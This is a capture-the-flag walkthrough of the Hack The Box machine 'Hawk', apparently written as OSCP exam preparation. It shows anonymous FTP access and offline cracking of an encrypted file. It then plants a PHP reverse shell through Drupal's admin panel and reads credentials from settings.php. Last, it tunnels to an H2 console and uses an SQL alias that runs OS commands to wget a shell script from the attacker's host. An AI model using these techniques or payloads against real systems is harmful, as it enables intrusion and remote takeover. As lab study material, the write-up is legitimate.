Hawk is our eighth machine in the OSCP list provided by [NetSec Focus](https://www.netsecfocus.com/)! Flaws with FTP, file coded in base64, services running, tunneling, and a new way to do some privilege escalation are part of this machine with hawk! The learning acquired from here shows some common flaws and misconfigurations. This is the eighth blog before my third attempt to the OSCP exam, so let's get to it!

## Information Gathering


### Nmap Scan
So, we start with a nmap scan to check what ports are open and what services are running in this machine.
```
nmap -sC -sV -p- -oN scan.nmap 10.10.10.102
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/nmap.png" alt="nmap scan">

There are couple ports and services running such as FTP in port 21 (which we can log in an anonymous), SSH in port 22, HTTP in port 80, and H2 Database in port 8082. There are other ports that are not named in this article.

### Loging FTP as Anonymous
So as I said before, we can login in FTP as anonymous user, and actually, going to the directory ```messages``` there is a file that might contain interesting information which is  ```.drupal.txt.enc```

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/ftp.png" alt="nmap scan">

aftergetting the file, we see that has a password and it is base64 encoded, so let's decode it. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/ftp-gotten.png" alt="nmap scan">

So, to decode we use the command with [base64](https://linux.die.net/man/1/base64) to get the file.
```
base64 -d drupal.txt.enc > drupal_decode.txt.enc
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/decode.png" alt="nmap scan">

Great! Now it's time to crack the password!

### Brute Forcing SSL Salted Password

As we saw the format displayed with the images above, there is a program that can help us to crack this SSL salted password called [bruteforce-salted-openssl](https://github.com/glv2/bruteforce-salted-openssl), and we are using the wordlist rockyou. 
~~~ s
root@kali:~/htb/coffee/hawk/10.10.10.102# bruteforce-salted-openssl -t 6 -f /usr/share/wordlists/rockyou.txt -d sha256 drupal_decode.txt.enc
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.

Tried passwords: 27
Tried passwords per second: inf
Last tried password: secret

Password candidate: friends
~~~

Great, so the password in order to get this file is ```friends```, let's see what we find inside. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/cracked.png" alt="nmap scan">

So, there is a note about the password for the portal, looks like we have to login in our HTTP port from our browser using the password  ```PencilKeyboardScanner123```.

### Login & Reverse Shell

Getting in the portal from our browser we can login as ```admin``` with the password found it before which is ```PencilKeyboardScanner123```, and we're in! Now it's time to see how we can get a shell from here.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/got-admin.png" alt="nmap scan">

Looking at different things, there is the possibility to publish an article, but just HTML is allow to put in here, but if we want to execute some php code, in ```modules```, we can see the posibility to allow to write articles in php. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/modules.png" alt="nmap scan">

Now, once we set the option to write articles in php, we can go to ```Add Content``` and put our [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) from Pentest Monkey, then change some parameters such as IP and Port. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/before-shell.png" alt="nmap scan">

Set up a netcat listener, save the file, and get the shell!

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/shell-gotten.png" alt="nmap scan">

Wolah! We got a shell. 

### User Flag

Extrangely we can get the user flag as www-data!

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/user-flag.png" alt="nmap scan">

But, would be nice if we escalate privileges to Daniel, right?

### Privileges Escalation to Daniel

Doing basic enumeration, there was information that MySQL was running in the system and drupal can manage some credentials from MySQL, so googling things such as __drupal mysql settings__, there was a page explaining that you can find the credentials at ```/var/www/html/sites/default/settings.php``` and correctly we found some credentials linked to Daniel user. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/passwordfound.png" alt="nmap scan">

Now havinf the credentials it's time to get in the system as Daniel, so 
```
su daniel
```
We can overpass the python entry by the pty library...
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/daniel.png" alt="nmap scan">
 
 And we're in once again! Also, we can read the flag. 

 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/flag-daniel.png" alt="nmap scan">

 Looks like time to escalate to root, huh?

### Privileges Escalation to Root

 Do you remember the port 8082 running H2 Database? Well, we can find it in the enumeration by running [LinEnum.sh](https://github.com/rebootuser/LinEnum).

  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/H2.png" alt="nmap scan">

  we can find it in services as well. 

   <img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/services.png" alt="nmap scan">

   The problem here is that when we visit the website as ```http://10.10.10.102:8082/``` and we can log in due to it's not allowed to let people from outside to log in. So, having Daniel's credentials we can do some tunneling and get the service from our local host. 

   ```
ssh -L 8080:127.0.0.1:8082 daniel@10.10.10.102
   ```
So, basically what we're doing here is to tunnel the service running in port 8082 to our localhost to run in port 8080. Then, after doing this, we can get in ```http://localhost:8080/```. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/h2-database.png" alt="nmap scan">

So, where it says test we can change it to ```root``` and get access to the console. Once in the console we can add some kind of MySQL sintax where we can use wget in order to get our reverse shell. The shell used is a Bash TCP shell, so this is the sintax in order to download our file, before doing this remember to set up an HTTP Server in your localhost. 
```SQL
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
CALL SHELLEXEC('wget http://10.10.16.80/shell')
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/wget.png" alt="nmap scan">

After this is time to rename the file ```shell``` to ```shell.sh``` and give it execution permisions, after doing it we can set up our netcat listener and call the shell. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/hawk/call-shell.png" alt="nmap scan">

### Root Flag

After getting the root it's time read the flag because we owned the system!

## To conclude

This machine was complex for me due to my lack of knowledge of MySQL Sintax, there were some good readings in interenet but [0xrick](https://0xrick.github.io/hack-the-box/hawk/) was pretty helpful with this. The privilege escalation was not that curious due to the drupal documentation about the credentials, but stills fun!
